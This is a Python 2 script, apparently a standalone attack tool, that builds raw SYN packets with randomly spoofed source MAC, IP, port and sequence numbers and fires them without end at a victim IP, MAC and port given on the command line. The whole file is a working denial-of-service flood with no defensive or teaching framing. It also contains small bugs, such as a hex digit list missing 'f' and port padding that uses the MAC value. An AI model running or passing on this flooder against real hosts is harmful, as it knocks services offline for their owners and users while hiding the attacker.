from PacketInjector import PacketInjector
import random
import argparse


hex_enum = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c',
            'd', 'e']

def checksum(s):
    # loop taking 2 characters at a time
    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    # complement and mask to 4 byte short
    s = ~s & 0xffff
    return s

def syn_flood(victim_ip_hex, victim_mac_hex, victim_port_hex):
    syn_flood_packet = ''

    # input victim mac here
    Dest_MAC = victim_mac_hex

    # fake random mac
    Src_MAC = random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + \
              random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + \
              random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum)

    syn_flood_packet = syn_flood_packet + Dest_MAC + Src_MAC + '0800'

    ###################
    ## IP Protocol Part
    ip_header_len = '45'
    DS_Field = '00'
    total_len = '0028'
    id = '107f'
    ip_flags = '0000'
    ttl = '40'
    ip_protocol = '06'

    src_ip = random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + \
             random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum)

    # victim_ip
    dest_ip = victim_ip_hex

    s1 = int('4500', 16) + int('0028', 16) + \
         int('107f', 16) + int(ip_flags, 16) + int('4006', 16) + int(src_ip[0:4], 16) + \
         int(src_ip[4:8], 16) + int(dest_ip[0:4], 16) + int(dest_ip[4:8], 16)

    ip_check_sum = hex(checksum(s1))[2:6]
    if len(ip_check_sum) == 1:
        ip_check_sum = '000' + ip_check_sum
    elif len(ip_check_sum) == 2:
        ip_check_sum = '00' + ip_check_sum
    elif len(ip_check_sum) == 3:
        ip_check_sum = '0' + ip_check_sum

    syn_flood_packet = syn_flood_packet + ip_header_len + DS_Field + total_len + \
                       id + ip_flags + ttl + ip_protocol + ip_check_sum + src_ip + dest_ip

    ##############################
    ## TCP Protocol Part
    src_port = random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum)

    # victim_port
    victim_port = victim_port_hex

    seq_num = random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + \
              random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum)

    ack_num = random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + \
              random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum) + random.choice(hex_enum)

    tcp_flag = '5002'
    window_size = '0200'

    urgent_pointer = '0000'

    s2 = int(src_ip[0:4], 16) + int(src_ip[4:8], 16) + \
         int(dest_ip[0:4], 16) + int(dest_ip[4:8], 16) + \
         int('0006', 16) + int('0014', 16)

    s2 = s2 + int(src_port, 16) + int(victim_port, 16) + int(seq_num[0:4], 16) + \
         int(seq_num[4:8], 16) + int(ack_num[0:4], 16) + int(ack_num[4:8], 16) + \
         int(tcp_flag, 16) + int(window_size, 16) + int(urgent_pointer, 16)

    tcp_checksum = hex(checksum(s2))[2:6]
    if len(tcp_checksum) == 1:
        tcp_checksum = '000' + tcp_checksum
    elif len(tcp_checksum) == 2:
        tcp_checksum = '00' + tcp_checksum
    elif len(tcp_checksum) == 3:
        tcp_checksum = '0' + tcp_checksum

    syn_flood_packet = syn_flood_packet + src_port + victim_port + seq_num + \
                       ack_num + tcp_flag + window_size + tcp_checksum + urgent_pointer

    return syn_flood_packet


## shoot the packet
if __name__ == '__main__':

    ap = argparse.ArgumentParser()
    ap.add_argument('-i', nargs=1)
    ap.add_argument('-v', nargs=1)
    ap.add_argument('-m', nargs=1)
    ap.add_argument('-p', nargs=1)

    opts = ap.parse_args()
    interface = opts.i[0]
    victim_ip = opts.v[0]
    victim_mac = opts.m[0]
    victim_port = opts.p[0]

    victim_mac = victim_mac.replace(':', '').lower()

    victim_ip_parts = victim_ip.split('.')
    victim_ip = ''
    for victim_ip_part in victim_ip_parts:
        hex_part = hex(int(victim_ip_part)).split('x')[1]
        if len(hex_part) == 1:
            hex_part = '0' + hex_part

        victim_ip += hex_part


    victim_port = hex(int(victim_port)).split('x')[1]

    if len(victim_port) == 1:
        victim_port = '000' + victim_mac

    elif len(victim_port) == 2:
        victim_port = '00' + victim_port

    elif len(victim_port) == 3:
        victim_port = '0' + victim_port

    packet_inj = PacketInjector(interface)
    print 'ready to syn flood'
    while True:
        packet_inj.send_raw_hex(syn_flood(victim_ip, victim_mac, victim_port))
